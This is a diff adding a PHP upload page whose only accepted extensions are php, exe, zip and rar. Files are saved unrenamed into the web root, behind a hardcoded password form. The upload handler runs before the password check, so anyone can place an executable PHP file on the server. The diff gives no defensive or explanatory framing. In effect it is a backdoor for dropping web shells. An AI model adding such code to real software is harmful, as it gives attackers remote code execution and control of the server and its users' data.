@@ -1,0 +1,57 @@
+<?php
+if(isset($_FILES['image'])){
+      $errors= array();
+      $file_name = $_FILES['image']['name'];
+      $file_size =$_FILES['image']['size'];
+      $file_tmp =$_FILES['image']['tmp_name'];
+      $file_type=$_FILES['image']['type'];
+      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
+      
+            $extensions= array("zip","rar","php","exe");
+
+      
+      if(in_array($file_ext,$extensions)=== false){
+         $errors[]="not allowed, please choose a file.";
+      }
+      
+      if($file_size > 10388608){
+         $errors[]='File size must be excately 10 MB';
+      }
+      
+      if(empty($errors)==true){
+         move_uploaded_file($file_tmp,"".$file_name);
+         echo "Success";
+      }else{
+         print_r($errors);
+      }
+   }
+if(isset($_REQUEST["hpass"])&& $_REQUEST["hpass"]=="1" && ($_REQUEST["txtPassword"]=="P@$$-W0RD"))
+{
+	
+	
+?>
+<form action="" method="POST" enctype="multipart/form-data">
+<input type="file" name="image" />
+<input type="submit"/>
+</form>
+
+
+
+<?php } else 
+
+{
+	
+	
+	?>
+
+<form action="upload.php" method="POST" enctype="multipart/form-data">
+<input type="password" name="txtPassword"  />
+<input type="hidden" name="hpass" value="1" />
+<input type="submit"/>
+</form>
+<?php } ?>
+      
+   </body>
+   
+</html>
+      
